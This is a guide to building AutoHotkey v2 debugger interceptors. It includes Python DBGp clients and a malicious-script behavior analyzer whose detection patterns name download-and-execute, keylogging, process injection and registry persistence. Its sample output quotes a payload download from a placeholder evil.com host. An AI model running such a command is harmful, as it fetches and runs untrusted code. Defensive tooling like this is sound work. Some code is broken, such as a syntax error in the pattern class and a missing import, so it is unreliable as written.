# AutoHotkey v2 Low-Level Debugger Interceptor Implementation Guide

**Created:** 2025-10-23
**Purpose:** Create custom debugging infrastructure for AHK v2 script analysis
**Use Case:** Defensive security analysis, behavior monitoring, advanced debugging

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Existing Debugger Infrastructure](#existing-debugger-infrastructure)
3. [Building a Custom Interceptor](#building-a-custom-interceptor)
4. [Implementation Examples](#implementation-examples)
5. [Advanced Techniques](#advanced-techniques)
6. [Security Considerations](#security-considerations)
7. [Complete Working Example](#complete-working-example)

---

## Architecture Overview

### Debugger Components

```
┌─────────────────────────────────────────────────────────────┐
│                    AHK Script Execution                      │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ├──→ PreExecLine(Line*)        [Every line]
                      ├──→ DEBUGGER_STACK_PUSH()     [Function entry]
                      ├──→ DEBUGGER_STACK_POP()      [Function exit]
                      └──→ PreThrow(Exception*)      [Exceptions]
                      │
                      ▼
         ┌────────────────────────────┐
         │   Debugger Class (C++)     │
         │  - Breakpoint management   │
         │  - Stack tracking          │
         │  - Variable inspection     │
         │  - DBGp protocol handler   │
         └────────┬───────────────────┘
                  │
                  ├──→ TCP Socket (localhost:9000)
                  │       │
                  │       ▼
                  │   ┌─────────────────┐
                  │   │  IDE / Client   │
                  │   │  (SciTE, VSCode)│
                  │   └─────────────────┘
                  │
                  └──→ Custom Interceptor (Your Code)
```

### Key Files

| File | Location | Purpose |
|------|----------|---------|
| `Debugger.h` | `/home/user/AutoHotkey/source/Debugger.h` | Debugger interface |
| `Debugger.cpp` | `/home/user/AutoHotkey/source/Debugger.cpp` | DBGp protocol implementation |
| `debug.h` | `/home/user/AutoHotkey/source/debug.h` | Debug macros (TRACE, ASSERT) |
| `script.cpp` | `/home/user/AutoHotkey/source/script.cpp` | Execution hooks |
| `error.cpp` | `/home/user/AutoHotkey/source/error.cpp` | Exception hooks |

---

## Existing Debugger Infrastructure

### 1. DBGp Protocol (Debugger Protocol)

**Standard:** [DBGp Protocol Specification](https://xdebug.org/docs/dbgp)
**Used by:** Xdebug (PHP), Komodo IDE, Visual Studio Code

**Message Format:**
```
[length]\0<?xml version="1.0" encoding="UTF-8"?>[XML payload]\0
```

**Supported Commands:**

| Category | Commands | Example |
|----------|----------|---------|
| Execution | `run`, `step_into`, `step_over`, `step_out`, `break`, `stop` | `step_into -i 1` |
| Breakpoints | `breakpoint_set`, `breakpoint_get`, `breakpoint_list` | `breakpoint_set -t line -f file:///script.ahk -n 42` |
| Stack | `stack_get`, `stack_depth` | `stack_get -d 0` |
| Variables | `property_get`, `property_set`, `context_get` | `property_get -n myVar -d 0` |
| Status | `status`, `feature_get`, `feature_set` | `feature_get -n max_depth` |

### 2. Interception Points

#### A. Line Execution Hook

**Location:** `script.cpp:10027-10028`

```cpp
#ifdef CONFIG_DEBUGGER
if (g_Debugger.IsConnected())
    g_Debugger.PreExecLine(this); // 'this' is the Line* pointer
#endif
```

**What it captures:**
- Every script line before execution
- Line number, file, and content
- Current execution state

#### B. Function Call/Return Hooks

**Stack Push - Location:** `script_expression.cpp:2065`

```cpp
#ifdef CONFIG_DEBUGGER
DEBUGGER_STACK_PUSH(&recurse);  // UDFCallInfo* for user functions
#endif
```

**Stack Pop - Location:** Various function exit points

```cpp
#ifdef CONFIG_DEBUGGER
DEBUGGER_STACK_POP();
#endif
```

**What it captures:**
- Function name and arguments
- Call depth and recursion level
- Local variable scope

#### C. Exception Hook

**Location:** `error.cpp:136-145`

```cpp
#ifdef CONFIG_DEBUGGER
if (g_Debugger.IsConnected()) {
    if (g_Debugger.PreThrow(aToken) && !(g.ExcptMode & EXCPTMODE_CATCH)) {
        // Debugger client suppressed default exception handling
        g_script.FreeExceptionToken(aToken);
        return FAIL;
    }
}
#endif
```

**What it captures:**
- Exception type and message
- Stack trace at throw point
- Ability to suppress exception

### 3. Stack Tracking

**Structure:** `Debugger.h` lines 100-150

```cpp
struct DbgStack {
    enum StackEntryType { SE_Thread, SE_BIF, SE_UDF };

    struct Entry {
        Line *line;           // Current line being executed
        union {
            LPCTSTR desc;     // Thread description (hotkey name, timer)
            NativeFunc *func; // Built-in function pointer
            UDFCallInfo *udf; // User-defined function call info
        };
        StackEntryType type;
    };

    Entry *mBottom, *mTop, *mTopBound;
    size_t mSize;

    // Methods
    Entry *Push();  // Allocate new stack entry
    void Pop();     // Remove top entry
    int Depth();    // Current call depth

    // Variable access
    void GetLocalVars(int aDepth, VarList *&aVars,
                      VarList *&aStaticVars,
                      VarBkp *&aBkp, VarBkp *&aBkpEnd);
};
```

**Usage Example:**

```cpp
// Get variables at stack depth 0 (current function)
VarList *vars, *static_vars;
VarBkp *bkp, *bkp_end;

g_Debugger.mStack.GetLocalVars(0, vars, static_vars, bkp, bkp_end);

// Iterate through variables
for (Var *var = vars->mItem; var < vars->mEnd; ++var) {
    // Access var->mName, var->Get(), etc.
}
```

---

## Building a Custom Interceptor

### Approach 1: Extend Existing Debugger

**Pros:** Leverage existing infrastructure, DBGp protocol support
**Cons:** Requires modifying AutoHotkey source code

**Steps:**

1. Add custom command to `Debugger::sCommands[]`
2. Implement command handler
3. Add hooks for custom events
4. Recompile AutoHotkey

### Approach 2: External Monitor (Recommended)

**Pros:** No source modifications, can analyze any AHK script
**Cons:** Limited to DBGp protocol capabilities

**Steps:**

1. Create TCP client connecting to AHK debugger
2. Send DBGp commands to control execution
3. Parse responses to extract debugging data
4. Implement custom analysis logic

### Approach 3: Hybrid Interceptor

**Pros:** Maximum flexibility, deep integration
**Cons:** Requires both source mods and external client

**Steps:**

1. Add custom DBGp command for specialized data
2. Create external client to consume data
3. Perform analysis in separate process

---

## Implementation Examples

### Example 1: Basic External Debugger Client (Python)

**File:** `debugger_client.py`

```python
#!/usr/bin/env python3
"""
AutoHotkey v2 DBGp Debugger Client
Connects to AHK debugger and intercepts execution
"""

import socket
import base64
import xml.etree.ElementTree as ET
from typing import Optional, Dict, List

class AHKDebuggerClient:
    def __init__(self, host='localhost', port=9000):
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.transaction_id = 0
        self.breakpoints: Dict[str, int] = {}

    def connect(self):
        """Wait for AHK to connect"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(1)

        print(f"[*] Waiting for AutoHotkey on {self.host}:{self.port}...")
        self.socket, addr = server.accept()
        print(f"[+] Connected from {addr}")

        # Receive init message
        init_msg = self._receive()
        print(f"[+] Init: {init_msg[:200]}...")

        return init_msg

    def _receive(self) -> str:
        """Receive DBGp message: [length]\0[XML]\0"""
        # Read length
        length_buf = b''
        while b'\0' not in length_buf:
            length_buf += self.socket.recv(1)

        length = int(length_buf.rstrip(b'\0'))

        # Read XML data (length + NULL terminator)
        data = b''
        while len(data) < length + 1:
            chunk = self.socket.recv(length + 1 - len(data))
            if not chunk:
                raise ConnectionError("Socket closed")
            data += chunk

        return data.rstrip(b'\0').decode('utf-8')

    def _send(self, command: str):
        """Send DBGp command"""
        self.transaction_id += 1
        cmd = f"{command} -i {self.transaction_id}\0"
        self.socket.send(cmd.encode('utf-8'))

    def _command(self, command: str) -> ET.Element:
        """Send command and parse XML response"""
        self._send(command)
        response = self._receive()

        # Parse XML (skip XML declaration if present)
        if response.startswith('<?xml'):
            response = response[response.index('?>') + 2:]

        return ET.fromstring(response)

    def run(self):
        """Continue execution until next breakpoint"""
        return self._command("run")

    def step_into(self):
        """Step into next line"""
        return self._command("step_into")

    def step_over(self):
        """Step over next line"""
        return self._command("step_over")

    def step_out(self):
        """Step out of current function"""
        return self._command("step_out")

    def breakpoint_set(self, file: str, line: int) -> int:
        """Set line breakpoint"""
        file_uri = f"file:///{file.replace('\\', '/')}"
        resp = self._command(f"breakpoint_set -t line -f {file_uri} -n {line}")
        bp_id = int(resp.get('id'))
        self.breakpoints[f"{file}:{line}"] = bp_id
        return bp_id

    def stack_get(self, depth: int = 0) -> List[Dict]:
        """Get call stack at depth"""
        resp = self._command(f"stack_get -d {depth}")

        stack = []
        for frame in resp.findall('stack'):
            stack.append({
                'level': int(frame.get('level')),
                'type': frame.get('type'),
                'filename': frame.get('filename'),
                'lineno': int(frame.get('lineno', 0)),
                'where': frame.get('where', ''),
            })
        return stack

    def property_get(self, name: str, depth: int = 0) -> Dict:
        """Get variable value"""
        resp = self._command(f"property_get -n {name} -d {depth}")

        prop = resp.find('property')
        if prop is None:
            return None

        # Decode value (base64 encoded)
        value_elem = prop.find('.')
        if value_elem is not None and value_elem.text:
            value = base64.b64decode(value_elem.text).decode('utf-8')
        else:
            value = prop.text or ''

        return {
            'name': prop.get('name'),
            'fullname': prop.get('fullname'),
            'type': prop.get('type'),
            'value': value,
            'size': int(prop.get('size', 0)),
        }

    def context_get(self, depth: int = 0, context_id: int = 0) -> List[Dict]:
        """Get all variables in context (0=local, 1=global)"""
        resp = self._command(f"context_get -d {depth} -c {context_id}")

        variables = []
        for prop in resp.findall('.//property'):
            # Decode base64 value
            value_text = prop.text or ''
            if prop.get('encoding') == 'base64' and value_text:
                value = base64.b64decode(value_text).decode('utf-8')
            else:
                value = value_text

            variables.append({
                'name': prop.get('name'),
                'fullname': prop.get('fullname'),
                'type': prop.get('type'),
                'value': value,
                'numchildren': int(prop.get('numchildren', 0)),
            })

        return variables

    def eval(self, expression: str, depth: int = 0) -> str:
        """Evaluate expression"""
        # Base64 encode expression
        expr_b64 = base64.b64encode(expression.encode('utf-8')).decode('ascii')
        resp = self._command(f"eval -d {depth} -- {expr_b64}")

        prop = resp.find('property')
        if prop is not None and prop.text:
            return base64.b64decode(prop.text).decode('utf-8')
        return ''


# Example usage
if __name__ == '__main__':
    client = AHKDebuggerClient()

    # Start AHK with: AutoHotkey.exe /Debug script.ahk
    init = client.connect()

    print("\n[*] Setting breakpoint at line 10...")
    bp_id = client.breakpoint_set("C:\\path\\to\\script.ahk", 10)
    print(f"[+] Breakpoint ID: {bp_id}")

    print("\n[*] Running until breakpoint...")
    client.run()

    print("\n[*] Getting call stack...")
    stack = client.stack_get()
    for frame in stack:
        print(f"  [{frame['level']}] {frame['where']} at {frame['filename']}:{frame['lineno']}")

    print("\n[*] Getting local variables...")
    vars = client.context_get(depth=0, context_id=0)
    for var in vars:
        print(f"  {var['name']} = {var['value']} ({var['type']})")

    print("\n[*] Stepping into next line...")
    client.step_into()

    print("\n[*] Continuing execution...")
    client.run()
```

### Example 2: Execution Trace Logger

**File:** `trace_logger.py`

```python
#!/usr/bin/env python3
"""
AHK Execution Trace Logger
Logs every line execution with variables and call stack
"""

import json
import time
from debugger_client import AHKDebuggerClient

class ExecutionTracer:
    def __init__(self, output_file='trace.json'):
        self.client = AHKDebuggerClient()
        self.output_file = output_file
        self.trace_log = []
        self.start_time = None

    def trace_execution(self, max_steps=1000):
        """Trace script execution step-by-step"""
        self.client.connect()
        self.start_time = time.time()

        print(f"[*] Starting execution trace (max {max_steps} steps)...")

        for step in range(max_steps):
            # Step into next line
            result = self.client.step_into()

            # Check if stopped or finished
            status = result.get('status')
            if status in ['stopped', 'stopping']:
                print(f"[!] Script stopped at step {step}")
                break

            # Get current location
            stack = self.client.stack_get(depth=0)
            if not stack:
                break

            current_frame = stack[0]

            # Get local variables
            variables = self.client.context_get(depth=0, context_id=0)

            # Log entry
            entry = {
                'step': step,
                'timestamp': time.time() - self.start_time,
                'file': current_frame['filename'],
                'line': current_frame['lineno'],
                'function': current_frame['where'],
                'depth': len(stack),
                'variables': {v['name']: v['value'] for v in variables},
                'stack': stack,
            }

            self.trace_log.append(entry)

            # Progress indicator
            if step % 100 == 0:
                print(f"  Step {step}: {current_frame['filename']}:{current_frame['lineno']}")

        # Save trace
        self.save_trace()
        print(f"[+] Trace saved to {self.output_file}")

    def save_trace(self):
        """Save trace log to JSON"""
        with open(self.output_file, 'w') as f:
            json.dump({
                'total_steps': len(self.trace_log),
                'duration': time.time() - self.start_time,
                'trace': self.trace_log
            }, f, indent=2)

    def analyze_trace(self):
        """Analyze trace for insights"""
        print("\n=== Trace Analysis ===")

        # Count lines executed
        line_counts = {}
        for entry in self.trace_log:
            key = f"{entry['file']}:{entry['line']}"
            line_counts[key] = line_counts.get(key, 0) + 1

        print(f"\nHottest lines (executed most):")
        for line, count in sorted(line_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {count:5d}x  {line}")

        # Function call counts
        func_counts = {}
        for entry in self.trace_log:
            func = entry['function'] or '<main>'
            func_counts[func] = func_counts.get(func, 0) + 1

        print(f"\nFunction execution counts:")
        for func, count in sorted(func_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {count:5d}x  {func}")

        # Max call depth
        max_depth = max(e['depth'] for e in self.trace_log)
        print(f"\nMaximum call depth: {max_depth}")


if __name__ == '__main__':
    tracer = ExecutionTracer(output_file='ahk_trace.json')
    tracer.trace_execution(max_steps=5000)
    tracer.analyze_trace()
```

### Example 3: Variable Watch Monitor

**File:** `variable_monitor.py`

```python
#!/usr/bin/env python3
"""
Variable Change Monitor
Tracks when specific variables change during execution
"""

from debugger_client import AHKDebuggerClient
from typing import Set, Dict

class VariableMonitor:
    def __init__(self, watch_vars: Set[str]):
        self.client = AHKDebuggerClient()
        self.watch_vars = watch_vars
        self.var_history: Dict[str, list] = {v: [] for v in watch_vars}

    def monitor_execution(self):
        """Monitor variable changes during execution"""
        self.client.connect()

        print(f"[*] Monitoring variables: {', '.join(self.watch_vars)}")

        step = 0
        while True:
            # Step into
            result = self.client.step_into()

            if result.get('status') in ['stopped', 'stopping']:
                break

            # Get current values
            current_values = {}
            for var_name in self.watch_vars:
                try:
                    prop = self.client.property_get(var_name, depth=0)
                    if prop:
                        current_values[var_name] = prop['value']
                except:
                    current_values[var_name] = '<error>'

            # Check for changes
            for var_name, value in current_values.items():
                history = self.var_history[var_name]

                if not history or history[-1]['value'] != value:
                    # Get location
                    stack = self.client.stack_get(depth=0)
                    location = f"{stack[0]['filename']}:{stack[0]['lineno']}" if stack else "unknown"

                    entry = {
                        'step': step,
                        'value': value,
                        'location': location,
                    }
                    history.append(entry)

                    old_value = history[-2]['value'] if len(history) > 1 else '<initial>'
                    print(f"[{step:5d}] {var_name}: {old_value} → {value} @ {location}")

            step += 1

        # Summary
        print("\n=== Variable Change Summary ===")
        for var_name, history in self.var_history.items():
            print(f"\n{var_name}: {len(history)} changes")
            for i, entry in enumerate(history[:10]):  # Show first 10
                print(f"  [{i}] {entry['value']} @ {entry['location']}")


if __name__ == '__main__':
    monitor = VariableMonitor(watch_vars={'myVar', 'counter', 'result'})
    monitor.monitor_execution()
```

---

## Advanced Techniques

### Technique 1: Custom Debugger Command (Source Modification)

**Add custom command to extract extended information**

**File:** `source/Debugger.cpp` (add to command table)

```cpp
// Add to Debugger::sCommands[] array (around line 520)
{"custom_trace", &Debugger::custom_trace},

// Implement custom command handler
int Debugger::custom_trace(char **aArgV, int aArgCount, char *aTransactionId)
{
    // Custom trace information
    mResponseBuf.WriteF("<response command=\"custom_trace\" transaction_id=\"%s\">"
                       , aTransactionId);

    // Add execution statistics
    mResponseBuf.WriteF("<stats lines_executed=\"%d\" functions_called=\"%d\"/>",
                       g_script.mLinesExecuted,  // Would need to add tracking
                       mStack.Depth());

    // Add memory usage
    PROCESS_MEMORY_COUNTERS pmc;
    GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
    mResponseBuf.WriteF("<memory working_set=\"%zu\" peak=\"%zu\"/>",
                       pmc.WorkingSetSize, pmc.PeakWorkingSetSize);

    // Add hook status
    mResponseBuf.WriteF("<hooks keyboard=\"%d\" mouse=\"%d\"/>",
                       g_KeybdHook != NULL, g_MouseHook != NULL);

    mResponseBuf.WriteF("</response>");
    SendResponse();

    return DEBUGGER_E_OK;
}
```

### Technique 2: Breakpoint Conditions with Logging

**Set conditional breakpoint that logs instead of breaking**

**File:** `source/Debugger.cpp` (modify PreExecLine)

```cpp
// Around line 200 in PreExecLine()
Breakpoint *bp = aLine->mBreakpoint;
if (bp && bp->state == BS_Enabled)
{
    // Check if it's a logging breakpoint (custom extension)
    if (bp->custom_flags & BP_FLAG_LOG_ONLY)
    {
        // Log execution without breaking
        LogExecutionEvent(aLine, "breakpoint_log");
        // Don't break, continue execution
        return DEBUGGER_E_OK;
    }

    // Normal breakpoint behavior
    if (bp->temporary) {
        SetBreakpointForLineGroup(aLine, nullptr);
        DeleteBreakpoint(bp);
    }
    return Break();
}

// Add logging function
void Debugger::LogExecutionEvent(Line *aLine, const char *aEventType)
{
    // Format: [timestamp] event_type | file:line | function | details
    SYSTEMTIME st;
    GetLocalTime(&st);

    fprintf(mLogFile, "[%02d:%02d:%02d.%03d] %s | %s:%d | %s | %s\n",
           st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
           aEventType,
           aLine->mFileSpec, aLine->mLineNumber,
           mStack.mTop > mStack.mBottom ? GetCurrentFunctionName() : "<main>",
           aLine->mActionType == ACT_EXPRESSION ? "expression" : "statement");

    fflush(mLogFile);
}
```

### Technique 3: Memory Access Tracking

**Track all variable reads/writes**

**File:** `source/var.cpp` (modify Var::Get and Var::Assign)

```cpp
// In Var::Get() around line 200
void Var::Get(ResultToken &aToken)
{
#ifdef CONFIG_DEBUGGER
    if (g_Debugger.IsConnected() && g_Debugger.IsTrackingMemory())
    {
        g_Debugger.LogMemoryAccess(this, "read", aToken);
    }
#endif

    // ... existing Get() implementation
}

// In Var::Assign() around line 300
ResultType Var::Assign(ExprTokenType &aValue)
{
#ifdef CONFIG_DEBUGGER
    if (g_Debugger.IsConnected() && g_Debugger.IsTrackingMemory())
    {
        g_Debugger.LogMemoryAccess(this, "write", aValue);
    }
#endif

    // ... existing Assign() implementation
}
```

### Technique 4: Function Call Profiler

**Track function execution time and call counts**

```cpp
// File: source/Debugger.h - Add to Debugger class

struct FunctionProfile {
    LPCTSTR name;
    DWORD call_count;
    DWORD total_time_ms;
    DWORD min_time_ms;
    DWORD max_time_ms;
    DWORD enter_tick;
};

std::map<LPCTSTR, FunctionProfile> mFunctionProfiles;

void ProfileFunctionEnter(LPCTSTR aFuncName) {
    auto &prof = mFunctionProfiles[aFuncName];
    prof.name = aFuncName;
    prof.enter_tick = GetTickCount();
}

void ProfileFunctionExit(LPCTSTR aFuncName) {
    auto &prof = mFunctionProfiles[aFuncName];
    DWORD elapsed = GetTickCount() - prof.enter_tick;

    prof.call_count++;
    prof.total_time_ms += elapsed;
    prof.min_time_ms = min(prof.min_time_ms, elapsed);
    prof.max_time_ms = max(prof.max_time_ms, elapsed);
}

// File: source/Debugger.cpp - Modify stack push/pop

DbgStack::Entry *DbgStack::Push()
{
    // ... existing code

#ifdef CONFIG_PROFILER
    if (entry->type == SE_UDF && entry->udf->func->mName)
        g_Debugger.ProfileFunctionEnter(entry->udf->func->mName);
#endif

    return entry;
}

void DbgStack::Pop()
{
#ifdef CONFIG_PROFILER
    if (mTop->type == SE_UDF && mTop->udf->func->mName)
        g_Debugger.ProfileFunctionExit(mTop->udf->func->mName);
#endif

    // ... existing code
}
```

---

## Security Considerations

### 1. Network Security

**Problem:** Debugger listens on network socket
**Risk:** Remote code execution if exposed to network

**Mitigations:**

```cpp
// File: source/Debugger.cpp - Restrict to localhost only

int Debugger::Connect(const char *aAddress, const char *aPort)
{
    // Force localhost only
    if (strcmp(aAddress, "localhost") != 0 && strcmp(aAddress, "127.0.0.1") != 0)
    {
        MsgBox("Debugger connections restricted to localhost for security");
        return DEBUGGER_E_INTERNAL_ERROR;
    }

    // ... existing connection code

    // Add authentication token (optional)
    char auth_token[64];
    GenerateRandomToken(auth_token, sizeof(auth_token));

    // Send in init message
    mResponseBuf.WriteF("<init ... auth_token=\"%s\"/>", auth_token);
}
```

### 2. Information Disclosure

**Problem:** Debugger exposes all script variables and code
**Risk:** Sensitive data leakage

**Mitigations:**

```cpp
// Add variable name filtering
bool Debugger::IsVariableExposable(Var *aVar)
{
    // Don't expose variables with "secret" or "password" in name
    if (stristr(aVar->mName, "secret") || stristr(aVar->mName, "password"))
        return false;

    // Check if marked as sensitive
    if (aVar->mAttrib & VAR_ATTRIB_SENSITIVE)
        return false;

    return true;
}
```

### 3. Code Injection via eval

**Problem:** `eval` command executes arbitrary AHK code
**Risk:** Debugger client can modify script behavior

**Mitigations:**

```cpp
// Disable eval in production mode
int Debugger::eval(char **aArgV, int aArgCount, char *aTransactionId)
{
#ifndef CONFIG_DEBUGGER_ALLOW_EVAL
    SendErrorResponse(aTransactionId, DEBUGGER_E_COMMAND_UNAVAIL,
                     "eval disabled in production builds");
    return DEBUGGER_E_COMMAND_UNAVAIL;
#endif

    // ... existing eval implementation
}
```

---

## Complete Working Example

### Project: Script Behavior Analyzer

**Purpose:** Analyze AHK script for suspicious behavior patterns

**File:** `behavior_analyzer.py`

```python
#!/usr/bin/env python3
"""
AutoHotkey Script Behavior Analyzer
Detects potentially malicious script patterns
"""

import re
from debugger_client import AHKDebuggerClient
from dataclasses import dataclass
from typing import List, Set

@dataclass
class Suspicious Pattern:
    name: str
    severity: str  # 'low', 'medium', 'high', 'critical'
    description: str
    pattern: str
    detected_at: List[str]

class BehaviorAnalyzer:
    def __init__(self):
        self.client = AHKDebuggerClient()
        self.patterns: List[SuspiciousPattern] = []
        self.api_calls: Set[str] = set()
        self.file_operations: List[Dict] = []
        self.network_operations: List[Dict] = []

    def define_patterns(self):
        """Define suspicious behavior patterns"""
        self.patterns = [
            SuspiciousPattern(
                name="Registry Persistence",
                severity="high",
                description="Script modifies registry Run keys for persistence",
                pattern=r"RegWrite.*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                detected_at=[]
            ),
            SuspiciousPattern(
                name="Download & Execute",
                severity="critical",
                description="Downloads file from internet and executes",
                pattern=r"(Download|UrlDownloadToFile).*\.(exe|bat|cmd|vbs|ps1)",
                detected_at=[]
            ),
            SuspiciousPattern(
                name="Keylogging",
                severity="critical",
                description="Captures keyboard input",
                pattern=r"(GetKeyState|Input|InputHook).*Loop",
                detected_at=[]
            ),
            SuspiciousPattern(
                name="Screen Capture",
                severity="medium",
                description="Takes screenshots",
                pattern=r"(PrintScreen|GetDC|BitBlt)",
                detected_at=[]
            ),
            SuspiciousPattern(
                name="Process Injection",
                severity="critical",
                description="Injects code into other processes",
                pattern=r"(WriteProcessMemory|CreateRemoteThread|VirtualAllocEx)",
                detected_at=[]
            ),
            SuspiciousPattern(
                name="Anti-Analysis",
                severity="high",
                description="Detects debugging or analysis",
                pattern=r"(IsDebuggerPresent|ProcessExist.*procmon|WinExist.*wireshark)",
                detected_at=[]
            ),
        ]

    def analyze_script(self, script_path: str):
        """Perform static analysis on script source"""
        print(f"[*] Static analysis of {script_path}...")

        with open(script_path, 'r', encoding='utf-8') as f:
            source = f.read()

        # Check patterns
        for pattern in self.patterns:
            matches = re.finditer(pattern.pattern, source, re.IGNORECASE)
            for match in matches:
                # Find line number
                line_num = source[:match.start()].count('\n') + 1
                pattern.detected_at.append(f"Line {line_num}: {match.group(0)}")

        # Report findings
        self._report_static_analysis()

    def analyze_runtime(self, max_steps=10000):
        """Perform dynamic analysis during execution"""
        print(f"\n[*] Dynamic analysis (max {max_steps} steps)...")

        self.client.connect()

        step = 0
        prev_line = None

        while step < max_steps:
            # Step into
            result = self.client.step_into()

            if result.get('status') in ['stopped', 'stopping']:
                break

            # Get current location
            stack = self.client.stack_get(depth=0)
            if not stack:
                break

            current = stack[0]
            current_line = f"{current['filename']}:{current['lineno']}"

            # Avoid duplicate checks
            if current_line == prev_line:
                step += 1
                continue
            prev_line = current_line

            # Get source line
            try:
                source_resp = self.client._command(f"source -f {current['filename']}")
                # Parse source (base64 encoded)
                import base64
                source_elem = source_resp.find('.')
                if source_elem is not None and source_elem.text:
                    full_source = base64.b64decode(source_elem.text).decode('utf-8')
                    lines = full_source.split('\n')
                    if current['lineno'] <= len(lines):
                        line_content = lines[current['lineno'] - 1]

                        # Check for suspicious API calls
                        self._check_api_calls(line_content, current_line)
            except Exception as e:
                pass

            # Check variables for sensitive data
            try:
                vars = self.client.context_get(depth=0, context_id=0)
                self._check_variables(vars, current_line)
            except Exception as e:
                pass

            step += 1

            if step % 1000 == 0:
                print(f"  Step {step}...")

        # Report findings
        self._report_dynamic_analysis()

    def _check_api_calls(self, line_content: str, location: str):
        """Check for suspicious API calls"""
        dangerous_apis = {
            'DllCall': 'medium',
            'ComObjCreate': 'medium',
            'Run': 'low',
            'RunWait': 'low',
            'Download': 'high',
            'FileAppend': 'low',
            'FileRead': 'low',
            'RegWrite': 'medium',
            'RegRead': 'low',
            'SendInput': 'low',
            'ControlSend': 'low',
        }

        for api, severity in dangerous_apis.items():
            if api in line_content:
                self.api_calls.add(f"{api} @ {location}")

                # Track specific dangerous operations
                if 'Download' in api or 'UrlDownload' in api:
                    self.network_operations.append({
                        'type': 'download',
                        'location': location,
                        'line': line_content
                    })
                elif 'FileAppend' in api or 'FileRead' in api:
                    self.file_operations.append({
                        'type': 'file_io',
                        'location': location,
                        'line': line_content
                    })

    def _check_variables(self, variables: List[Dict], location: str):
        """Check variables for suspicious patterns"""
        for var in variables:
            name = var['name'].lower()
            value = var['value'].lower()

            # Check for encoded data
            if len(value) > 100 and re.match(r'^[A-Za-z0-9+/=]+$', value):
                print(f"  [!] Possible base64 data in {var['name']} @ {location}")

            # Check for URLs
            if 'http://' in value or 'https://' in value:
                print(f"  [!] URL found in {var['name']}: {value[:100]} @ {location}")

            # Check for file paths
            if re.search(r'[A-Z]:\\', value, re.IGNORECASE):
                print(f"  [!] File path in {var['name']}: {value[:100]} @ {location}")

    def _report_static_analysis(self):
        """Report static analysis findings"""
        print("\n=== Static Analysis Report ===")

        critical = [p for p in self.patterns if p.severity == 'critical' and p.detected_at]
        high = [p for p in self.patterns if p.severity == 'high' and p.detected_at]
        medium = [p for p in self.patterns if p.severity == 'medium' and p.detected_at]

        if critical:
            print("\n[CRITICAL] Highly suspicious patterns detected:")
            for pattern in critical:
                print(f"  - {pattern.name}: {pattern.description}")
                for location in pattern.detected_at[:5]:  # Show first 5
                    print(f"      {location}")

        if high:
            print("\n[HIGH] Suspicious patterns detected:")
            for pattern in high:
                print(f"  - {pattern.name}: {pattern.description}")
                for location in pattern.detected_at[:3]:
                    print(f"      {location}")

        if medium:
            print("\n[MEDIUM] Potentially suspicious patterns:")
            for pattern in medium:
                print(f"  - {pattern.name}")

        if not critical and not high and not medium:
            print("\n[OK] No suspicious patterns detected in static analysis")

    def _report_dynamic_analysis(self):
        """Report dynamic analysis findings"""
        print("\n=== Dynamic Analysis Report ===")

        if self.network_operations:
            print(f"\n[!] Network Operations ({len(self.network_operations)}):")
            for op in self.network_operations[:10]:
                print(f"  - {op['location']}: {op['line'][:80]}")

        if self.file_operations:
            print(f"\n[!] File Operations ({len(self.file_operations)}):")
            for op in self.file_operations[:10]:
                print(f"  - {op['location']}: {op['line'][:80]}")

        if self.api_calls:
            print(f"\n[!] API Calls Detected ({len(self.api_calls)}):")
            for call in sorted(self.api_calls)[:20]:
                print(f"  - {call}")

    def generate_report(self, output_file='analysis_report.txt'):
        """Generate comprehensive report"""
        with open(output_file, 'w') as f:
            f.write("AutoHotkey Script Behavior Analysis Report\n")
            f.write("=" * 60 + "\n\n")

            # Static analysis
            f.write("STATIC ANALYSIS FINDINGS\n")
            f.write("-" * 60 + "\n")
            for pattern in self.patterns:
                if pattern.detected_at:
                    f.write(f"\n[{pattern.severity.upper()}] {pattern.name}\n")
                    f.write(f"Description: {pattern.description}\n")
                    f.write(f"Occurrences: {len(pattern.detected_at)}\n")
                    for loc in pattern.detected_at:
                        f.write(f"  {loc}\n")

            # Dynamic analysis
            f.write("\n\nDYNAMIC ANALYSIS FINDINGS\n")
            f.write("-" * 60 + "\n")
            f.write(f"Network operations: {len(self.network_operations)}\n")
            f.write(f"File operations: {len(self.file_operations)}\n")
            f.write(f"Unique API calls: {len(self.api_calls)}\n")

        print(f"\n[+] Report saved to {output_file}")


def main():
    import sys

    if len(sys.argv) < 2:
        print("Usage: python behavior_analyzer.py <script.ahk>")
        print("\nStart AHK with: AutoHotkey.exe /Debug script.ahk")
        sys.exit(1)

    script_path = sys.argv[1]

    analyzer = BehaviorAnalyzer()
    analyzer.define_patterns()

    # Static analysis
    analyzer.analyze_script(script_path)

    # Dynamic analysis
    print("\n[*] Waiting for AHK debugger connection...")
    print("    Start script with: AutoHotkey.exe /Debug script.ahk")

    try:
        analyzer.analyze_runtime(max_steps=5000)
    except KeyboardInterrupt:
        print("\n[!] Analysis interrupted by user")

    # Generate report
    analyzer.generate_report()


if __name__ == '__main__':
    main()
```

**Usage:**

```bash
# Terminal 1: Start analyzer (waits for connection)
python behavior_analyzer.py suspicious_script.ahk

# Terminal 2: Run AHK with debugger
AutoHotkey.exe /Debug suspicious_script.ahk

# Output:
# [*] Static analysis of suspicious_script.ahk...
# [CRITICAL] Highly suspicious patterns detected:
#   - Download & Execute: Downloads file from internet and executes
#       Line 42: Download("http://evil.com/payload.exe", "C:\temp\run.exe")
#
# [*] Dynamic analysis (max 5000 steps)...
#   Step 1000...
#   [!] URL found in downloadUrl: http://evil.com/payload.exe @ script.ahk:42
#   [!] File path in targetPath: C:\temp\run.exe @ script.ahk:42
#
# [+] Report saved to analysis_report.txt
```

---

## Build Instructions

### Building AutoHotkey with Custom Interceptor

1. **Clone repository:**
   ```bash
   git clone https://github.com/012090120901209/AutoHotkey.git
   cd AutoHotkey
   ```

2. **Open solution:**
   ```
   AutoHotkeyx.sln in Visual Studio
   ```

3. **Enable debugger:**
   - Ensure `CONFIG_DEBUGGER` is defined (default in non-SC builds)
